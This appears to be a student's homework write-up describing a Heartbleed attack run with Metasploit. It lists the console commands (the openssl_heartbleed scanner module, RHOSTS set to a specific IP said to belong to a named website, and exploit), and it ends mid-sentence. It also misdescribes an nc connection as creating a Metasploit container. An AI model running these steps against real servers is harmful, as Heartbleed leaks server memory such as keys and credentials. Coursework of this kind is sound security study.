Homework #4

Part 1: I started off by opening a Bash Terminal and making a metasploit container using the following command 
``` nc 159.89.233.47 1337``` and then running ```mfsconsole```.
The I ran ```search heartbleed``` to find the path for the heartbleed attack, and then selected it with ``` use auxiliary/scanner/ssl/openssl_heartbleed```.
Next, I set the parameters for the exploit and subsequently ran it with the following commands:
``` 
set RHOSTS 165.227.204.80
set VERBOSE true
exploit
```
This ran the exploit on the IP address 165.227.204.80, which is the IP address of the website www.briong.com. I found this by using a website where you give it a domain name and it returns itâ€™s IP address:
